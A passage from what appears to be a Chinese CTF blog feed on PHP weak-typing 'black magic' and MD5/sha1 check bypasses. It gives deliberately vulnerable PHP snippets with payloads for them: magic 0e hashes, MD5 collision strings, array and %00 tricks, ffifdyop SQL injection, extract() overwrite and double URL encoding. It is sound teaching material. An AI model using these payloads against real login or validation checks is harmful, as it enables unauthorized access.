title="strpos()函数缺陷"></a>strpos()函数缺陷</h2><p>strpos()函数用于查找字符串在另一字符串种第一次出现的位置（区分大小写）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="string">&#x27;abc&#x27;</span>) == <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里传入abc会打印123，但如果传入一个数组或不传入数据或传入没有<code>abc</code>的值都会打印123，这时因为该函数只解析<strong>string类型的字符串</strong>，给它个数组就不知到如何解析，就会返回<strong>null，null&#x3D;&#x3D;0</strong>，而当不传入数据或传入数据不包含<code>abc</code>时，就会由于找不到值而返回null。</p><h2 id="in-array-函数缺陷"><a href="#in-array-函数缺陷" class="headerlink" title="in_array()函数缺陷"></a>in_array()函数缺陷</h2><p>in_array()函数用来判断字符串是否存在与数组中，但是在判断的时候，会进行类型强制转换，就会出现数字比较的情况。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$array</span>=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;3&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;abc&#x27;</span>, <span class="variable">$array</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;1bc&#x27;</span>, <span class="variable">$array</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="字符串变量解析特性"><a href="#字符串变量解析特性" class="headerlink" title="字符串变量解析特性"></a>字符串变量解析特性</h2><p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串变量时，它会做两件事：</p><ul><li><strong>删除空白符</strong></li><li><strong>将某些字符<code>[+.</code>等等转换为下划线（包括空格）</strong></li></ul><p>例如：</p><table><thead><tr><th>User input</th><th>Decoded PHP</th><th>variable name</th></tr></thead><tbody><tr><td>%20foo_bar%00</td><td>foo_bar</td><td>foo_bar</td></tr><tr><td>foo%20bar%00</td><td>foo bar</td><td>foo_bar</td></tr><tr><td>foo%5bbar</td><td>foo[bar</td><td>foo_bar</td></tr></tbody></table><p><img src="/archives/afbb3374/3181170-20230517204753959-1827760493.jpg"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a_b_c_d&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="string">&quot;hello&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/archives/afbb3374/QQ20250120-200636.png"></p><p><strong>需要注意的是，当php版本小于8时，GET传参请求的参数名含有非法字符<code>.</code>，会被转为<code>_</code>，但如果参数名前面有<code>[</code>，这个<code>[</code>会被直接转为<code>_</code>，但如果后面有<code>.</code>，这个<code>.</code>就不会被转为<code>_</code>.</strong></p><p>如果有一个 WAF 规定<strong>某个参数的值必须是数字，不能包含字母时，我们就可以利用这个绕过。</strong></p><p><img src="/archives/afbb3374/QQ20250120-202011.png"></p><p>如上面**<code>[RoarCTF 2019]Easy Calc</code><strong>要求我们num变量必须为数字，此时</strong>我们可通过<code>?%20num=phinfo()</code>绕过**</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://nivi4.notion.site/PHP-8b2e93df6683422f815651f12d1b97c7">https://nivi4.notion.site/PHP-8b2e93df6683422f815651f12d1b97c7</a></p><p><a href="https://www.cnblogs.com/murkuo/p/15388795.html">https://www.cnblogs.com/murkuo/p/15388795.html</a></p><p><a href="https://www.cnblogs.com/gxngxngxn/p/17410173.html">https://www.cnblogs.com/gxngxngxn/p/17410173.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 黑魔法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD5和sha1绕过总结</title>
      <link href="/archives/af00d924/"/>
      <url>/archives/af00d924/</url>
      
        <content type="html"><![CDATA[<h2 id="弱比较类型"><a href="#弱比较类型" class="headerlink" title="弱比较类型"></a>弱比较类型</h2><ul><li><p>php中的等比较运算符有两种，<code>==</code>和<code>===</code>。</p><ul><li><code>==</code>：先将左右两边类型转化成一致，再进行比较值是否一致</li><li><code>===</code>：先比较左右类型是否一致，若一致再比较值是否一致</li></ul></li><li><p><strong>字符串与数字比较</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(&#x27;a&#x27; == 0);//bool(true)</span><br><span class="line">var_dump(&#x27;1a&#x27; == 1);//bool(true)</span><br><span class="line">var_dump(&#x27;12a&#x27; == 1);//bool(false)</span><br></pre></td></tr></table></figure><blockquote><p><strong>字符串在和数字比较的时候会将字符串转化为数字，如果字符串是以数字开头的，则会转换成数字再做比较，纯字符串则转换失败成false</strong></p></blockquote><p>例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key=123</span><br></pre></td></tr></table></figure></li><li><p><strong>布尔值与任意值比较</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(True == 0);//bool(false)</span><br><span class="line">var_dump(True == &#x27;False&#x27;);//bool(true)</span><br><span class="line">var_dump(True == 2);//bool(true)</span><br></pre></td></tr></table></figure></li><li><p><strong>hash值和字符串“0”比较</strong></p><p>因为当hash开头为0e后全为数字的话，进行比较时就会将其当做科学计数法来计算，用计算出的结果来进行比较。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$str1 = &quot;a&quot;;</span><br><span class="line">echo md5($str1);//0cc175b9c0f1b6a831c399e269772661</span><br><span class="line">var_dump(md5($str1) == &#x27;0&#x27;);//bool(false)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$str2 = &quot;s224534898e&quot;;</span><br><span class="line">echo md5($str2);//0e420233178946742799316739797882</span><br><span class="line">var_dump(md5($str2) == &#x27;0&#x27;);//bool(true)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$str3 = &#x27;a1b2edaced&#x27;;</span><br><span class="line">echo md5($str3);//0e45ea817f33691a3dd1f46af81166c4bool</span><br><span class="line">var_dump(md5($str3) == &#x27;0&#x27;);//bool(false)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var_dump(&#x27;0e111111111111&#x27; == &#x27;0&#x27;);//bool(true) </span><br></pre></td></tr></table></figure><blockquote><p><strong>第二、四条由于0e后全为数字，按科学计数法即0乘e的幂次方为0，所以比较为true</strong></p></blockquote></li></ul><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="strcmp函数绕过"><a href="#strcmp函数绕过" class="headerlink" title="strcmp函数绕过"></a>strcmp函数绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;xxxxx&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>], <span class="variable">$flag</span>) == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>); </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;No&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>strcmp(string1,string2)</code>，该函数返回：</p><blockquote><p><strong>0 - 如果两个字符串相等</strong></p><p><strong><code>&lt;</code>0 - 如果 string1 小于 string2</strong></p><p><strong><code>&gt;</code>0 - 如果 string1 大于 string2</strong></p></blockquote><p><strong>对于传入非字符串类型的数据的时候，strcmp函数会报错，将返回0。所以，strcmp()在比较字符串和数组的时候直接返回0，这样通过把目标变量设置成数组就可以绕过该函数的限制，构建payload：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]=1</span><br></pre></td></tr></table></figure><h3 id="MD5-sha1弱类型绕过"><a href="#MD5-sha1弱类型绕过" class="headerlink" title="MD5&#x2F;sha1弱类型绕过"></a>MD5&#x2F;sha1弱类型绕过</h3><ul><li><p><strong>0e绕过</strong></p><p><strong>弱比较会把0exxxx当做科学计数法，不管后面的值为任何东西，0的任何次幂都为0</strong></p><p>一些字符串md5值以0e开头：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s21587387a</span><br><span class="line">0e215962017</span><br></pre></td></tr></table></figure><p>sha1值以0e开头：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">10932435112: 0e07766915004133176347055865026311692244</span><br><span class="line">aaroZmOk: 0e66507019969427134894567494305185566735</span><br><span class="line">aaK1STfY: 0e76658526655756207688271159624026011393</span><br><span class="line">aaO8zKZF: 0e89257456677279068558073954252716165668</span><br><span class="line">aa3OFF9m: 0e36977786278517984959260394024281014729</span><br><span class="line">0e1290633704: 0e19985187802402577070739524195726831799</span><br></pre></td></tr></table></figure></li><li><p><strong>数组绕过</strong></p><p><strong>md5()函数计算的是一个字符串的哈希值，对于数组则返回false，如果是<code>md5((string)$apple) == md5((string)$banana))</code>则不能用数组，因为转换成字符串后都为NULL</strong></p></li></ul><h3 id="MD5-sha1强类型绕过"><a href="#MD5-sha1强类型绕过" class="headerlink" title="MD5&#x2F;sha1强类型绕过"></a>MD5&#x2F;sha1强类型绕过</h3><p><strong>因为强类型比较，不仅比较值，还比较类型，0e会被当做字符串，所以不能用0e来进行</strong><br><strong>但是我们可以用MD值完全相同的字符来进行绕过。</strong></p><ul><li><p><strong>数组绕过</strong></p><p>方法同上</p></li><li><p><strong>MD5强碰撞</strong></p><p><strong>即找到两个不同输入产生相同哈希值的过程。</strong></p><p>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=0e306561559aa787d00bc6f70bbdfe3404cf03659e704f8534c00ffb659c4c8740cc942feb2da115a3f4155cbb8607497386656d7d1f34a42059d78f5a8dd1ef</span><br><span class="line">b=0e306561559aa787d00bc6f70bbdfe3404cf03659e744f8534c00ffb659c4c8740cc942feb2da115a3f415dcbb8607497386656d7d1f34a42059d78f5a8dd1ef</span><br></pre></td></tr></table></figure></li></ul><h3 id="特定条件下的MD验证绕过：ffifdyop"><a href="#特定条件下的MD验证绕过：ffifdyop" class="headerlink" title="特定条件下的MD验证绕过：ffifdyop"></a>特定条件下的MD验证绕过：ffifdyop</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * from ’admin’ where password=md5($pass,true)</span><br></pre></td></tr></table></figure><p><img src="/archives/af00d924/QQ%E6%88%AA%E5%9B%BE20240304204716.png"></p><p>即MD5报文将以原始 16字符二进制格式返回</p><p>ffifdyop 字符串经过MD5加密后为276f722736c95d99e921722cf9ed621c<br>再转换成字符串为’or’6乱码</p><p>Select * from ’admin’ where password&#x3D;‘or’6乱码 相当于万能密码</p><h3 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$shiyan</span>)) &#123;</span><br><span class="line"><span class="variable">$content</span>=<span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$shiyan</span>==<span class="variable">$content</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&#x27;flag&#123;xxx&#125;&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&#x27;Oh.no&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>extract():函数从数组中将变量导入到当前的符号表</strong><br><strong>trim(string[charlist]):移除字符串两侧的空白字符或其他预定义字符，若省略后面一个参数，则去除<code>\0</code>、<code>\t</code>、<code>\n</code>、<code>\x0B</code>、<code>\r</code>和空格。</strong></p></blockquote><p>运用extract()将GET方式获得的变量导入到当前的符号表中，然后判断$flag和$shiyan两个变量的内容是否相等。那么我们将$flag和$shiyan这两个变量的内容都会被设置成空字符串。构建payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:?flag=&amp;shiyan=</span><br></pre></td></tr></table></figure><h3 id="限制传入的匹配"><a href="#限制传入的匹配" class="headerlink" title="限制传入的匹配"></a>限制传入的匹配</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="literal">FALSE</span>)</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;You password must be alphanumeric&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>], <span class="string">&#x27;--&#x27;</span>) !== <span class="literal">FALSE</span>)  <span class="comment">//判断是否包含-，!==既比较值也比较类型</span></span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span> . <span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;Invalid password&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>ereg()：限制传入内容，例如上面就是限制了只能传入数字以及大小写字母。</strong><br><strong>strpos()：查找字符串在另一字符串中第一次出现的位置。</strong></p></blockquote><p>对传入进行限制，但是又要求密码中含有–，因此我们这里有两种绕过方法：</p><ul><li><p><strong>数组法</strong></p><p>同样strpos()如果传入数组，会返回NULL，从而绕过对<code>--</code>的检测，构建payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password[]=1</span><br></pre></td></tr></table></figure></li><li><p><strong>截断法</strong></p><p>在<code>%00</code>后的函数无法识别，因此构建payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password=1%00--</span><br></pre></td></tr></table></figure></li></ul><h3 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">    <span class="variable">$key</span> =<span class="string">&quot;*********&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$message</span>-&gt;key == <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;~~~~&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>输入一个数组进行json解码，解码后的message与key值相同才会得到flag，使用弱类型进行绕过，key肯定是字符串，两个等号时会转化成同一类型再进行比较，直接构造一个0就可以相等了，通过0&#x3D;&#x3D;”admin”这种形式绕过，构建payload：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=&#123;&quot;key&quot;:0&#125;</span><br></pre></td></tr></table></figure><h3 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="literal">FALSE</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You password must be alphanumeric&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &lt; <span class="number">8</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>] &gt; <span class="number">9999999</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>], <span class="string">&#x27;-&#x27;</span>) !== <span class="literal">FALSE</span>) <span class="comment">//strpos — 查找字符串首次出现的位置 &#123;</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span> . <span class="variable">$flag</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&#x27;have not been found&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Invalid password&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>要求输入password的长度小于8位，且值要大于9999999，并且需要匹配到<code>-</code>，这里就要用到科学计数法了：</strong></p><ul><li><strong>1e10 &#x3D; 10^10</strong></li></ul><p>而匹配<code>-</code>可用截断法，所以构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password=1e10%00-</span><br></pre></td></tr></table></figure><h3 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">eregi</span>(<span class="string">&quot;hackerDJ&quot;</span>,<span class="variable">$_GET</span>[id])) &#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;hackerDJ&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Access granted!&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用GET传参时，浏览器就已经把hakerDJ进行了一次解码了，然后又用了urldecode函数又再次进行了一次解码。所以我们要将hakerDJ进行二次编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41</span><br></pre></td></tr></table></figure><h3 id="a-md5-a-，md5-a-md5-md5-a"><a href="#a-md5-a-，md5-a-md5-md5-a" class="headerlink" title="$a&#x3D;&#x3D;md5($a)，md5($a)&#x3D;&#x3D;md5(md5($a))"></a>$a&#x3D;&#x3D;md5($a)，md5($a)&#x3D;&#x3D;md5(md5($a))</h3><p><code>0e215962017</code> 的 MD5 值也是由 <strong>0e</strong> 开头，在 PHP 弱类型比较中相等:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$md5          md5($md5)</span><br><span class="line">0e00275209979 0e551387587965716321018342879905</span><br><span class="line">0e00506035745 